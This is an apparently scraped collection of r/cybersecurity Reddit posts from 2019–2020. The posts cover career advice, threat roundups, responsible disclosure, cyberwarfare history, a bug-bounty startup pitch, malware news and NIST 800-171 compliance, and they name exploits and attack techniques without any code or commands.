telecommunications networks) - Public key infrastructure and encryption systems - Command line tools - Network traffic analysis - Computer and network forensics - Vulnerability and malware analysis - Low level protocol and packet analysis So I am aware that many people want to become a Hacker or Penetration Tester professionally so I will briefly be discussing how one can best do that. **Education**: For a Degree, i'd recommend a degree in Computer Science, Computer Engineering, Computer Security, Cybersecurity (Technical Track), Cyber Operations or Information Technology. I'd recommend attending a school that is either an NSA Accredited [CAE-CD](URL or [CAE in Cyber Operations](URL **Experience**: You're going to need some experience if you're going to become a Pen Tester or Red Team Member. Some good experience to gain would be UNIX/Linux system administration, Windows system administration, Network Security, Network Administration - security and engineering, networking equipment (routers/firewalls/switches) and VPN administration **Certifications**: Some good entry level Penetration Testing Certifications would be the OSCP, very practical and well respected. And the Security + is generally a baseline for Security Jobs. And i'd advise against the CEH, its not practical at all and you can just memorize the answers and pass without actually knowing how to hack anything **Good ways to practice**: Theoretical knowledge is nothing if you cant practice it. There are a number of different ways you can get experience in Offensive Security (Legally of course). Capture the Flag Events such as the National Cyber League are great ways to apply your knowledge. And HacktheBox (while a bit more advanced) is probably the closest you can get to a real world Network Penetration Testing environment. **Conclusion**: I couldn't cover everything here, but I hope I was able to give you guys some solid knowledge that you can build on. Feel free to ask me any questions or send me a message if you have any questions. Thanks!"

This advancement has provided cyber criminals with thousands of opportunities to exploit and damage an organisations cybersecurity infrastructure. [The year 2019 had some worst data breaches.](URL 2020 is going to be a challenging year for the businesses, organisations and governments as the advanced cyber attacks are expected to rise. **Let us have a look at some of the top cybersecurity threats to watch out for in 2020.** 1. Over the last decade, Internet-connected smart devices used in offices and homes have proliferated. Most of these devices do not have enough security features installed, which allows attackers to coerce the device and enter the network. 2. All through 2019, ransomware kept standing out as truly newsworthy and will continue to be a prevalent threat in 2020. It is still the most reliable way for hackers to make money. 3. Deepfake attacks have shown remarkable growth in the past few years. With the help of advanced analytics technology, Generative Adversarial Networks (GANs), the threat actors can now produce fake but incredibly realistic videos and images that are difficult for humans to identity. In 2020, Deepfake attacks are likely to be an insidious threat to the cyber security landscape. 4. Since Microsoft has announced that the support and updates for Windows 7 will not be available after January 14 2020, the probability of cyber attacks are likely to increase in 2020. 5. Recently, a major security flaw was observed in the Huawei MateBook systems running the companys PCManager software. The software comprised an insecure driver that allowed underprivileged users to create processes with high-level privileges. Such loopholes let attackers to exploit the vulnerability and circumvent the devices security by using asynchronous procedure calls to further interrupt system processes and run malicious code. 6. Since 2016, web-skimming (or e-skimming) attacks have compromised thousands of e-commerce websites to collect customers payment card information. Over the time, the threat actors performing e-skimming attacks have also evolved and are ready to target small- and medium-sized businesses as well as government agencies. 7. With the recently developed malicious rootkits, the hacktivists will now attempt to compromise the supply chain of legitimate software packages by deploying hard-to-detect malware. The level of associated risk is high as the implanted malware would be difficult to remove even after formatting the system. 8. Threat actors are now exploring the innovations in technology to create a new wave of cyber attacks involving machine learning and artificial intelligence. They have developed a new AI-powered malware that has the potential to automate human skills and processes, and can significantly increase the scale of damage caused by malware attacks. 9. The advent and global adoption of 5G infrastructure technology will bring a new wave of 5G compatible devices, which would demand more security. Accordingly, the companies will be required to reassess their security paradigms for providing a secure and reliable mobile platform. 10. As an alternative to email, the hackers are now using interactive social media platforms like WhatsApp, Facebook, Instagram and LinkedIn to entice victims into immediate actions such as calling a deceitful contact number, visiting a malicious website or downloading files containing mobile malware. Such attacks are now becoming an emerging threat to the cyber space."

Unfortunately, I found some seemingly serious issues while testing the app. So far I've found that I could enumerate all user accounts without any authentication; the responses to such requests include name, e-mail address, DOB, sex and various health-related items such as average heart rate and distance travelled for the day. There are other routes I could easily use to get more details such as ECG data for any user. Most seriously however is a route which would allow me to reset the password for any user, allowing me to take over any account if I so wished (I want to emphasise: I don't). I haven't of course exploited any of these vulnerabilities; I am not interested in exploits, only in security. I of course want to let the affected company know about these flaws, however I'm not sure of the best way to do this. I've checked to see if they have a bug bounty and they don't appear to. I could of course contact the company directly via their website, but I'm worried that they might perceive my message as a threat rather than what I want it to be, specifically just a friendly warning. I've heard stories where security researchers are targeted after reporting a vulnerability responsibly, so I certainly don't want to go down that road! Perhaps an anonymous tip of some kind would be the best option? Any advice would be greatly appreciated. I only want to improve the security of this device and app for all of their users, I don't want these vulnerabilities to be exploited. I've omitted the name of the device, app and company from this post for obvious reasons."

By [David Hambling](URL 23, 2019TOWFIQU PHOTOGRAPHYGETTY IMAGES. [*The Decade, Reviewed*](URL *looks back at the 2010s and how it changed human society forever. From 2010 to 2019, our species experienced seismic shifts in science, technology, entertainment, transportation, and even the very planet we call home. This is how the past ten years have changed us.* The 2010s saw a step change in [cyber warfare](URL defined as attacks against a nation by a computer. Rather than just being used for spying, this was the decade the digital world was weaponized to break through to the physical. Analysts had long warned about the potential for cyber operations. Now, malware has attacked machinery, power grids, and military control systems and brought a new dimension to warfare. This is how cyberwarfare came of age in the 2010s. ### A Long List of Cyber Skirmishes In 2010, the [Stuxnet](URL worm targeted Iranian nuclear facilities. This was no ordinary piece of malware, but the product of what political scientist P.W. Singer called [a Manhattan Project-like](URL effort, by unknown actors. Stuxnet infected logic controllers running industrial machinery, specifically targeting centrifuges used for enriching uranium. The malware made the centrifuges spin out of control and tear themselves apart, severely disruption Irans nuclear program. Soon this kind of [Cyber Coercion](URL became an established technique for applying strategic political pressure. In March 2013, [simultaneous attacks](URL on six of South Koreas financial institutions damaged 32,000 computers. The attacks came at a time of heightened tension with North Korea. It wouldn't take long for the South Korean government to trace those attacks to Pyongyang. And it wouldn't be the last time South Korea would be the victim of a cyber attack. After deploying the U.S. THAAD missile defense system in 2016, China loudly denounced the move, applying economic pressure and unleashing a [series of cyber attacks](URL The Chinese military term for this sort of campaign is [weishe](URL (), which can be translated as either deterrence or compellence. While it failed to persuade South Korea to drop THAAD, it gave a taste of what China is prepared to dounofficially, of coursein support of its policies. Cyber warfare also bled into traditional battlefields. In 2014 Ukrainian artillery officers fighting Russian-backed opposition forces used an app to direct howitzer fire. The app was hacked by Russian group [Fancy Bear](URL and an infected version was distributed with embedded spyware. The spyware gave away the users' location, and Ukrainian officers found their positions [coming under highly accurate enemy fire](URL guided by the hijacked app. But if Russia has cyber skills, so too does the United States. After a U.S. drone was shot down over the Strait of Hormuz in June 2019, President Trump [called off airstrikes](URL against Iran due to risk of casualties. But that didn't stop the U.S. from immediately [hitting Iranian missile and rocket forces](URL with its own cyber attack, putting them out of action for an unknown length of time. ### A Utility Vulnerability A blackout in Ukraine in 2015.MAX VETROVGETTY IMAGES Shutting down the power grid via cyber attack has long been the stuff of techno thrillers and [media scare stories](URL but the nightmare became real in 2015 when [BlackEnergy](URL malware hit Ukrainian electricity supplies, [leaving over 200,000 people without power](URL The attack, allegedly carried out by Russia, affected the SCADA (Supervisory Control and Data Advisory) system which controls distribution, disconnecting substations from the grid. It could only be overcome by switching to manual control. The BlackEnergy incident is the first known case of a cyber attack taking down power distribution, but it will surely not be the last. Security agencies report that Russia has [made intrusions into the U.S. energy infrastructure](URL since 2016. They may even [be behind attacks](URL this September. While the attacks didn't cause any outages, they did cause ""blind spots"" for grid operators for about half a day. The electricity kept flowing, but it was a wake-up call that such systems aren't as safe as previously thought. ### Democracy In the Crosshairs SAUL LOEBGETTY IMAGES But the attacks that grabbed the most headlines came from malware attacks, often perpetrated by intelligence agencies using cybercrime to cloak activities. Ransomware, a type of malware which locks up a computer and encrypts data so the user can only get their information back by paying off the attacker, has been around for a while. But in 2017, there were three particularly damaging ransomware vectors: Petya, NotPetya, and Wannacry. All were closely related, and a White House official described NotPetya as [""the most destructive and costly cyber attack in history](URL Strangely, the malware seemed to be corrupted, and victims could not pay the ransom even if they tried. But the twist came when the software was revealed to be a sabotage tool masquerading as ransomware. Eventually, [the NSA pointed the finger at Russia](URL though, ironically, the exploit which it was based on had been previously discovered by the NSA itself. Similarly, an attack in 2018 which hijacked details of some 500 million people from the Marriott Hotels data stores looked like the work of criminals. But the intrusion was [traced to a Chinese intelligence agency](URL apparently as part of their efforts to sweep up data to target significant individuals. The 2010s was also the decade when democracy itself came under attack from the internet. Russia in particular has been identified as the source of [covert meddling in elections](URL and [increasing numbers of Russian chatbots](URL have been identified pushing Putins agenda on social media around the world. These machines are supplemented by an army of humans at Russias ""troll factory""  officially the [Internet Research Agency](URL in St Petersburgwhere staff are paid to engage in online discussions in blogs and comments sections, repeating arguments and spreading disinformation. The IRA even have their [own fake blogs and news sites](URL backed by software to generate large numbers of post views toma boost their rankings. The full impact of this interference, and direct cyberattacks such as those [directed at voter registration](URL in several U.S. states, has yet to be established. ### Up Next: A Growing Threat Military operations during Cyber Blitz 2019, an exercise for practicing cyber operations.ERIC THOMPSON Considering all this unseen digital malfeasance, the U.S. military finally got serious about cyber warfare in the 2010s. [Cyber Command](URL (aka USCYBERCOM), a tiny outfit in 2010, achieved the status of a [unified combatant command](URL led by a four-star general in 2017. This puts it on a level with Strategic Command, which co-ordinates nuclear forces. USCYBERCOM similarly draws together Army, Navy, and Air Force elements (as well as Marine Corps and Coast Guard) and now has more than 6,000 personnel in 133 teams. USCYBERCOM was initially conceived as being used for defense but can now carry out a full spectrum of military cyberspace operations, includes offensive measures. Naturally, its capabilities are secret and its operations are not disclosed. But some details are known such as Operation Glowing Symphony, a successful [campaign against ISIS](URL that brought down the terrorist groups media operation, taking out websites, mobile apps, and communications. Increasingly, the military see cyberspace as an additional domain alongside air, land, and sea. But it's a battlefield where skirmishes are fought without war ever being declared, and an adversary never fully known. Any future war is likely to include cyber attacks as well as physical ones. In many ways, the 2010s for cyber feel like what the 1910s were for aviation during WW1. While air forces made up only a tiny section in the U.S. Army before the Great War. it rapidly grew until it became key aspect of modern warfare by mid-century. In a couple decades, cyber warfare might become the deciding factor between who wins and who loses."

Social Graph Analysis and Attribution of Software Exploit Contributors Using GitHub (Supervisor: Jeremy Abramson) Attribution of threat actors is an increasingly important and difficult problem. One potential mitigation is the early detection of potential threat actors via analysis of open-source intelligence (OSINT). This project will analyze the social graph of users who contribute to, follow, star, and otherwise interact with proof-of-concept CVE implementations and other relevant potentially malicious (e.g. software vulnerability) repositories. # 2. Textual, Structural and Semantic Analysis of Phishing Datasets (Supervisor: Jeremy Abramson) Phishing attacks  both specifically and broadly targeted  are an increasingly dangerous vector for malice. Because of the textual and semantic similarities between potentially malicious and benign emails, detection of subtle phishing attacks can be difficult. This project aims to provide a high-level textual and structural analysis of different phishing datasets to determine what features in a conversational chain may be useful in increasing detection of phishing attacks. Students will work on textual extraction of features (intent, sentiment, tone, etc.) and analysis of externally verifiable content (company affiliation, etc.). # 3. Detecting Malware Campaign Lifecycles from Behavioral Analysis (Supervisor: Jeremy Abramson) This project aims to detect and coalesce families of malware articles and campaigns by analyzing their behavior and interactions with the outside world. Features such as network activity, system component interactions and others can be used to cluster malware articles and determine the duration of malware campaigns otherwise thought to be independent. Students will work on Exploration of open-source malware API contents (e.g. VirusTotal), construction of malware behavioral data set, generation of similarity metrics (network traffic access patterns, system interactions, etc.) and analysis and clustering of malware articles and campaigns. ELLIGIBILTY: To apply, students must meet the following criteria at the time of application: * US citizens or permanent residents * enrolled at an accredited higher learning institution (including two-year institutions) * be at least in their second year of study (exceptional freshmen may be considered) * not be in their last year of study for the given undergraduate degree (i.e. rising sophomores to rising seniors) Timeline Applications due: Feb 1, 2020 (NOTE: If you're *extremely* interested, please contact me for an extension) Acceptance notifications:Feb 15 - Mar 1, 2020 Program duration:May 31 - July 25, 2020 GENERAL INFO: In our program, students will participate in an 8-week research experience at USC/ISI campus in Marina del Rey.

149,vulnerability,cybersecurity,SnowHat | Game Hacking | Bug Bounty Platform,1,eci8tm,https://www.reddit.com/r/cybersecurity/comments/eci8tm/snowhat_game_hacking_bug_bounty_platform/,2019-12-19 07:37:51,"Dear fellow hackers, As a startup company (Cyrex Ltd) that is specialised in application security, we are developing a bug bounty platform (codename: SnowHat) that is entirely focused on hacking gaming applications. We strongly believe that gaming applications are different to classic industry applications. Consider the used programming language, frameworks, architecture used and more importantly the way data is being transmitted (transport protocol). Therefore, it's a natural direction for us to create a bug bounty platform that is fully focused around the security of gaming applications. The objective of this thread is to validate the concept of our product/service. Therefore, **your** **feedback** is extremely valuable to us, especially in this phase of development where the platform is subject to constant change. **Mindset** Game hacking is very different in comparison to classic penetration testing, it requires two mindsets: one of a cheater and one of a hacker. Two very similar mindsets yet there are distinct differences between them. Cheating is all about finding an advantage that a regular player would not be able to have, this requires gaming knowledge, strategic insights and most importantly quickly understanding in game mechanics. While hacking is all about exploiting technical vulnerabilities, understanding what is going on under the hood of the application. **Assets** The platform currently covers the following categories: 1. Games (browser, mobile, client and console) 2. Game relatable applications (forums, launchers, management tools, ...) 3. Anti-cheat solutions/wrappers (EAC, BattlEye, ...) **Gamification** Through gamification (challenges, achievements, ...), we want to create a bug bounty platform that encourages hackers to start their journey as a white hat security expert and more importantly reward them for their findings. We have implemented clan mechanics, just like in any other MMO, this in order to build a community and add in that competitive element, which really takes this platform to a next level. Ranks are implemented accompanied by leaderboards and ranks are based on the prestige of the player. Prestige points are unlocked for each legit disclosed report. **Communities** For SnowHat, it made full sense to cooperate with hacking communities as these communities are often where all things start. They act as a gold mine of educational resources that will help any hackers in developing their hacking skill set. Therefore, we want to give back to those communities by partnering up. For each member originating from these communities that finds a vulnerability, a percentage of the bounty is paid back to the community by SnowHat. Two large partnerships were established so far, attracting over 500K members to the platform. **Gaming companies** Next to generating a user base of ethical hackers, we started establishing partnerships with gaming companies, an obvious yet fundamental element that will define the success of SnowHat. The platform targets mid-to-large size companies that either develop or publish gaming applications with online multiplayer features (as there's no such thing as security in offline games). **Communication and QA** The SnowHat team acts as an intermediate communication layer between the ethical hacker and the gaming company. The ethical hacker will never be in direct contact with the gaming company, the ethical hacker will be collaborating with SnowHat staff, vice versa for gaming companies. In this way we can maintain and enforce quality assurance on many different levels (communication, quality of report, triage, ...). **Release** Best-case, we are planning to release into beta mid Q2 2020. At first, the beta will only be accessible to the members of the communities we've partnered with. After continuous validation of at least 1 month, the platform will be publicly available to anyone. To give you an idea of what the platform will look like, we included the following images (screenshots). Take into account that all of this is subject to change, thus not a final version. By using dummy data some of the screenshots might be confusing. &amp;#x200B; [Frontstore - Home](URL [Frontstore - Cheaters](URL [Frontstore - Companies](URL [Hacker dashboard - Hacktivity\/Pwnage](URL [Hacker dashboard - Hackables](URL [Hacker dashboard - Inbox - Reports\/Write-ups](URL [Hacker dashboard - Leaderboard](URL [Hacker dashboard - Clans](URL [Hacker dashboard - Badges\/Achievements](URL We want to thank the Reddit users in advance for reading this post and more importantly for giving their feedback.

Articles like these, particularly ones hyper-focusing on vendors (in this case RSA MFA) as the problem to cover up for lack of competency in our industry is wildly ignorant and infuriating. Not only does it point fingers, it doesn't provide a solution. This is the typical knee-jerk reaction to blame the vehicle, not those at the wheel. (More on that later...) &amp;#x200B; As Greta would say...HOW DARE YOU! I'm chuckling, you should too. &amp;#x200B; Now lets pick this apart: 1. Lack of context. RSA Tokens are like PKI. You have seed, like the private key in PKI, and that is used in an algorithm to generate tokens, which are like the public key in PKI. There are a few ways of importing software tokens with RSA on an internet-connected (Read: not air-gapped) network ranging from ""The wrong way"" (file based) to ""The right way"" (CT-KIP). This article is based on using the WORST possible method (intended for an air-gapped network in a secure facility), with a smidge of security in mind- seed files generated with a target device definition. That's like buying a Tesla and then using autopilot to film a porno on the highway at high speeds. Is it possible? Yeah apparently! Was that the intended use of autopilot? For the love of Christ people NO! 2. Focusing on the wrong things. Then we italicize Fox-IT. In a nutshell- ZDNet is saying, that Fox-IT said, they found a vulnerability in the RSA software token. Now, if there were, the ethical thing to do would be to confirm this and then report to RSA. Instead- here I'm seeing that, again, this is building off an already bad situation that should've never existed if everything was properly implemented in the first place. To expand the Tesla example, it's like posting an article with a clickbait title such as ""Pornstar caught hacking autopilot"" and then saying we've found a major design flaw in Tesla vehicles- pointing out how they theoretically could have been using stress balls to simulate the pressure of hands on the wheel while autopilot is engaged. Did they hack autopilot? Sure, we could say that! Is it a Tesla design flaw? Well, why don't you call up Elon and ask how to make a porno in your new Tesla? I'm going to assume the answer won't be ""Use autopilot"". 3. Lastly...HOW DID APT20 GET THE TOKEN SEED IN THE FIRST PLACE?! Oh wait, that's right...according to the article, the customer was already owned. If this article is accurate, clearly the company has terrible security practices not only with the implementation of RSA, but then leaving their seed files scattered across the network. So lets go blame Tesla for that porn video. It's not the driver's fault- it just happened! They should really consider updating autopilot to ask if you're making a porno first. Shame on you for not thinking of these things Elon! &amp;#x200B; What can we learn from this? First of all, play stupid games, win stupid prizes. To anyone using RSA soft tokens...USE CT-KIP!!!!!!!!! And if you need help with best practices with any vendor, ASK!!!!! Secondly, we all should be focusing on the issue in the IT industry of security incompetency and fixing it- not defending stupidity and finding ways to support it. This affects us all. Lastly, pretty proud of this one, I just compared the coverage of a cyber-security breach to filming a pornography in a Tesla. One will live on forever on Pornhub and you'll probably never see it again unless you go there, the other needs to stop as it's a drum that keeps on beating and affects our everyday lives. I do not work for ZDNet, a competitor of ZDNet, RSA, Tesla, or Pornhub in any capacity. I'm just a Cyber-security geek who hates seeing this blame-game/finger-pointing over and over again in our industry. #GoGreta &amp;#x200B; TL;DR We, as a community, need media to stop bashing the tech companies that help us move in the right direction and start focusing on the bigger picture of how to implement these tools properly. If you use RSA soft tokens, use CT-KIP."

So I'm a System Admin of 4 years (24yo) in a 2 man shop looking for a more focused path in Cybersecurity, specifically Penetration Testing. I cover everything from the network infrastructure, server infrastructure, firewalls, virtualization, VPNs, help desk, etc etc. I've got a BS in IT and my CCNA in R&amp;S (though this just recently expired). I also plan on taking my Security+ exam January 25th. So far, I've been watching The Cyber Mentor's ""Zero to Hero"" course, and have been doing a few VulnHub VMs to get me started. Now that The Cyber Mentor just released a more in depth course on Udemy, I just signed up and have begun that as well. My plan is to finish this course, practice by doing Vulnhub boxes and HTB, and then hopefully have enough knowledge/background to go for the OSCP possibly late next year. And before I do this, I would like to take what I learn from studying (vulnerability scanning, LLMNR attacks, Kerberoasting, NTLM relay, IPv6 mitm, Bloodhound, etc etc) and make sure my current environment isn't susceptible to these, and in the event they are, close these vulnerabilities. By the end of all of this, I would hope to at least land a junior level interview and possibly work my way up. I really would like to keep going down the rabbit hole that I am, and would like any feedback/critiscm on what my plan and goal looks like. If you guys have ant suggestions for me, please let me know. This is definitely a career path change from where I am now, and so far I love it. Thanks!"

When a company experiences a breach in their cybersecurity, making reparations to the damage usually costs the company not only a large amount financially, but also in terms of reputation. Therefore, companies must make sure they prevent such a breach or unauthorized access from taking place by almost any means necessary. Below are some suggested tips on how to prevent data breaching in the digital era of the year 2020: **What is a Data Breach?** Data breaching is a process by which an organization experiences a cyber-attack, which lets hackers gain illegitimate or unauthorized access to an organizations system or network to steal sensitive and personal information, or data of users or customers. When a company experiences a breach in their cybersecurity, making reparations to the damage usually costs the company not only a large amount financially, but also in terms of reputation. Therefore, companies must make sure they prevent such a breach or unauthorized access from taking place by almost any means necessary. Below are some suggested tips on how to prevent data breaching in the digital era of the year 2020: * **Updated Security Software** Software developers constantly improve their products (software) thereby making upgraded versions available. An organization must have the latest version of its cybersecurity software to avoid weak spots for hackers to exploit. * **Risk Assessments** Frequent vulnerability checks on your system should be done. This will help your business to review and improve security procedures and policies. * **Regular employee security training and awareness** Hackers dont abstractly just get access to a network or a system, there is usually an entry point. Employees are often the crack-in-the-wall that hackers use in breaching a companys security. Employees are the likeliest to click on suspicious links, download anti-viruses. In other words, an honest mistake by an employee is all any hacker needs in breaching your network. Therefore, to ensure the utmost safeguarding of important data, employees need to attend regular classes on cybersecurity until following safe practices becomes a norm. Read full article [here:](URL"
154,vulnerability,cybersecurity,Sisters CC number stolen and iPhone sent to her address. Has anyone seen anything like this or have an explanation?,1,eidx84,https://www.reddit.com/r/cybersecurity/comments/eidx84/sisters_cc_number_stolen_and_iphone_sent_to_her/,2020-01-01 15:27:43,"My sister was recently hacked and since I work in Cybersecurity, she asked me for an explanation. However, my focus is in enterprise vulnerability management so I am quite ignorant when it comes to this type of situation. I was wondering if anyone has ever heard of or seen something similar. So here is what happened: My sister noticed that a large purchase was made at Apple that she did not authorize. She called Chase to inform them that this was a fraudulent charge and ended up getting her money back. She then saw an email from Apple that an iPhone 11 had been shipped to HER address. A few days later she received the package. She then noticed that there was an additional phone number tied to her Chase account which she found to be some 16 year old kid living in Chicago. She plans to take the package to Apple to return the phone, but I looked at the address on the return label and something didnt match up. I couldnt find the actual address, but the general location is just outside of Nashville, TN. The address on the return label was: 1025 Darrell Waltrip Dr. Lebanon, TN 37090. My thought, someone got a hold of her cc number and/or chase account and ordered the iPhone to her address with their address as the return address (which I dont know how they would do that?). Then they are hoping that she would notice the fraudulent charge and send the package back, which would end up at their doorstep. Have any of you seen or heard of anything like this? Was hoping someone could give me some insight."

156,vulnerability,cybersecurity,Feeling overwhelmed on the learning curve,1,eimbu1,https://www.reddit.com/r/cybersecurity/comments/eimbu1/feeling_overwhelmed_on_the_learning_curve/,2020-01-02 06:17:58,"I'm going to try and keep this from becoming a ""how do I learn ABC so that I can eventually do XYZ"" post so bear with me. Should this exact topic exist already in another post I'd appreciate a PM so I can pull this one down and keep from adding to mess of ""how do I start"" posts. TL;Dr: How did you keep from getting overwhelmed by what you didn't know in this field, and what actions did you take to get to where you are now as a technician as a result?(Did you specialize, take a course, have a mentor, OJT, etc). Some Background: Active duty US Military for 7+ yrs. My MOS/Rate is in IT. I've received a lot of great military training from the basics like A+/Net+/Sec+. My last duty station was as hands on as it can get for us sometimes. Mobile communications where I was the ISSM and Lead Administrator for our Network (I know, shouldn't be a thing but manning shortfall created this issue). My team and I did all the networking, server management, vulnerability scanning and patching with Nessus, tons of HBSS experience since that was deployed on our Network, virtualization, and so on. Our Network was our responsibility so we had to learn a lot as we worked. Since leaving there I've entered into a staff role where we manage and monitor vulnerability management systems and HBSS status for a large number of units. My military experience is awesome. I'm also in school at UMGC pursuing a B.S. in Cybersecurity and I'm almost 100 credits in (thanks applicable military experience for jump-starting that). Funding and time allowing it, I should graduate in a little over a year Now to the meat: I know there are large gaps in my knowledge. I was a jack of all trades at my last unit due to the skeleton crew we had to work with. In a little less than 3 years I will either reenlist or get out. Should I choose to exit the service, I want to be more prepared to get a job in a red team/blue team role before moving into higher management later down the road. I've checked job postings so I could familiarize myself with the standard requirements that private sector and govt jobs are looking for. Pretty standard stuff: Sprinkle a good security related cert here, some applicable experience or degree there, dash in some scripting or programming, and you can get in the door. That was my initial thought anywhere. As I dive deeper into the topics of what I should know for these kinds of jobs and research useful skill sets, it's so easy to become overwhelmed by the sheer lack of knowledge I actually have. I'm shit with programming concepts, I'm not nearly as good at networking as I thought, there are what feels like 8 million different toolsets you can use to accomplish a handful of tasks, every certification is different and somehow better or worse than the others which makes choosing so difficult, etc. When you all began learning in this field, what kept you from getting so overwhelmed? Did you choose to specialize in one interesting area over others? Did you have a structure of courses to go through? What tactics did you use to learn and motivate yourself to become a better technician and more valuable as a potential hire? I have time to prepare to get out should I choose to do so, but I can't even begin to focus on one thing since I feel like I lack so much know-how. Please share your personal experiences too, as what you write might help me and others who come across this problem. Advice, stories, links, anything is appreciated."

Before you buy that special someone the latest tech gadget with all the fancy new features consider some of the recent headlines: &gt;[Can Your Holiday Gift Spy on You?](URL &gt; &gt;[Don't buy these gifts for your privacy-minded friends, Mozilla warns](URL &gt; &gt;[Now even the FBI is warning about your smart TV's security](URL &gt; &gt;[The 7 'creepiest' smart gadgets people give as holiday gifts, according to experts](URL Nothing out of the ordinary with any of the above items: a vacuum cleaner, a teddy bear, an aquarium and a motorized scooter, but they all hand vulnerabilities, because they either stored data or had the ability to transmit data from Bluetooth or wi-fi. The main problem with these devices is security is really an afterthought and frankly it shouldnt be. If the device can connect to your home network or do other devices on your network then as much consideration should be given to security as it is for computers, cell phones and game consoles. If youre planning on buying a new device either as a gift or for yourself considering the following (From the Online Trust Alliance)  Do a basic search online with the item name + vulnerability or + privacy issue to see if anyone in the security community has found any issues with the device  Check the manufacturers website to see if they even host security patches/firmware updates, if they dont thats a Red Flag they havent given much thought to device security  Before purchase, confirm your ability to return the device for a refund if upon set up you find the security and/or privacy practices do not meet your personal requirements. If you cannot opt out of sharing data with third parties or are not provided the option of opting in, consider alternative products.  Before purchase, review the devices warranty and support policies and verify that security and software patches are provided for the life of the product, beyond that of the warranty offered by the manufacturer.  Review the privacy practices of connected devices you own or are considering buying, including data collection and sharing policies with third parties. Reset permissions to reflect your preferences (for example  data collection and sharing, camera and microphone settings and other functions). If your settings cannot be modified, consider the reset to factory settings option to force a clean setup. **References** Online Trust Alliance [Smart Device Purchase &amp; Setup Checklist](URL [Is Your Holiday Gift Spying On You?

The malware targets web servers, network drives and removable drives using eight different exploit and brute force attacks. More precisely, the software in question employs EternalBlue; DoublePulsar; the exploits for CVE-2014-6287, CVE-2017-12615, and CVE-2017-8464; and three ThinkPHP exploits for multiple versions. While it installs the XMRig monero (XMR) Central Processing Unit-based mining software, BlackSquid could also deliver other payloads in the future. According to Trend Micro data, most of the instances of the malware in question have been detected in Thailand and the United States. The malware can reportedly infect a system via three different routes: through a website hosted on an infected server, exploits, and removable or network drives. BlackSquid also cancels the infection protocol if it detects that the username, device driver or the disk drive model suggests that the software is running in a sandbox environment. It has also been reported that as many as 50,000 servers worldwide have allegedly been infected with an advanced cryptojacking malware that mines the privacy-focused open source cryptocurrency turtlecoin (TRTL). Cybercriminals are also now exploiting known vulnerability CVE-2019-3396 for crypto mining in the software Confluence, a workspace productivity tool made by Atlassian.

177,vulnerability,cybersecurity,Theoretically hacking a movie theater,16,dlz828,https://www.reddit.com/r/cybersecurity/comments/dlz828/theoretically_hacking_a_movie_theater/,2019-10-24 00:20:44,"Before I start I'd like to say this is just a partial joke analysis post I've been meaning to make for a while and I just wanted to know this sub's thoughts. Also as a disclaimer, I found out all this info in about a day so I could definitely be wrong. If there are any theater experts, please correct me. So a few months ago, I got curious as to if anyone has hacked a movie theater and leaked a movie online as a result. I didn't find much but *I did find* a bunch of specifications and videos created by Disney on how movie projectors work and how to operate them. Here is what I found: Movies used to be sent in hard drives called DCPs (Digital Cinema Package). However with the progress of internet, they are now sent over a satellite &amp; internet combination service. They are still called DCPs because it's essentially a ZIP file that can contain multiple movies and requires a key to unlock. Often the key will unlock the media for a set period of time like 2 weeks before a new key must be entered. The actual movie files are stored in JPEG 2000 format with seperate audio files. Here's the thing. Originally, the DCP hard drive used to be plugged directly into the projector. Now however, **the DCPs are stored on a Unix cinema server (with a cinema specific OS)**. Every projector is connected to the Cinema server, making it much easier to use one DCP for multiple projectors. The thing is, given that DCPs are now downloaded over the internet (even if partially), it means the theater will have their unix server connected to the internet (and obviously their LAN). Therefore it is in the realm of possibility that you can find a vulnerability in the unix server (or social engineering, whatever you want) to gain access. The issue however is what you plan to do. If you want to play a video on a random theater, you would need to make a DCP package (which isn't too hard). If you want to pirate the movie, you would have to do it over a few days to avoid suspicion because the actual **DCP package can be more than 300 Gb** You would also have to convert from JPEG 2000 and encode the audio files (they are seperate I believe) into a usable format as well. Also in terms of vulnerabilities, I highly doubt a small movie theater is security aware especially if so many of these huge companies can't get it right. Plus the OS probably doesn't get many updates as it's built very specific for handling DCPs and projectors. No I'm not going to go hack my local theater now but it would be intresting to see this play out in real life."
178,vulnerability,cybersecurity,How to Comply with NIST 800-171,10,dmsu7h,https://www.reddit.com/r/cybersecurity/comments/dmsu7h/how_to_comply_with_nist_800171/,2019-10-25 16:26:21,"## WHAT IS NIST? The National Institute of Standards &amp; Technology (NIST) provides a policy framework of security guidance for how the private sector can assess and improve their ability to treat various types of cyber-risks. NISTs cybersecurity framework leverages business drivers to improve an organizations risk management practices and establish activities to reduce risks. &amp;#x200B; [NIST Functions @ https:\/\/URL ## OK, SO... WHAT IS NIST 800-171? NIST 800-171: Controlling Unclassified Information in Nonfederal Systems &amp; Organizations is a special publication that defines information security standards, guidelines, and minimum requirements for non-federal information systems storing, transmitting, or processing controlled unclassified information (CUI). This publication affects institutions that contract with the U.S. federal government to manage CUI. CUI is information that is concerning but not necessarily perceived as secret or confidential. However, CUI requires safeguarding to comply with applicable law, regulations, and government-wide policies. For further clarification, the government uses four classifications to classify information. 1. Unclassified 2. Confidential 3. Secret 4. Top Secret Unclassified information is not a classification, yet it is an identification or marking that signifies that information is not deemed as sensitive (from the governments perspective) and is acceptable for consumption by citizens such as DoD contractors, private investigators, and researchers. The government leverages the confidential classification for data or information that could cause damage if divulged or exposed without authorization. Loss of secret data could cause serious damage, but not as significant as top secret data. The exposure of top secret data could potentially cause significant damage to an organizations operations. ### Differences Between Government &amp; Business Classifications Please note that government classification and business classifications differ significantly. What may be deemed as low and consumable for citizens by the government could have a major impact on an organization, especially if the business classifies that same data as sensitive, critical, or if it provides the business with a competitive advantage. Data classification is the enterprise's ability to classify and prioritize business processes, data, and systems by considering its sensitivity and criticality (importance). For more information on data classifications and minimum security requirements, please reference *""Using Data Classifications for Effective Decision Making"" by Blake Curtis* ## SO HOW DO I BECOME NIST 800-171 COMPLIANT? ### Three Holistic Components There are three holistic components we need to complete for a NIST 800-171 assessment. Those components are comprised of documentation, reviews, and the authorizing officials (project sponsors) approval. However, just because weve completed these steps does not mean that our program is compliant. Your program needs to be independently assessed and verified by a third party that doesnt have a vested interest or bias in the completion of your project or success. Your client organizations must be able to communicate the need for a compliant environment and engage its risk, compliance, and security teams to create documentation that substantiates their conformance to NIST 800-171. They must also demonstrate the employment of ongoing monitoring measures to assure continuous compliance. Subsequently, there are various levels of review that must be accomplished throughout the certification and accreditation process. &amp;#x200B; [Blake Curtis' NIST 800-171 Holistic 3 Step Process](URL ### Documentation There is a tremendous amount of documentation associated with any NIST 800-171 effort. For example, a complete assessment of one of my client organizations comprised just four systems and a virtualized file &amp; print server that resulted in over 300 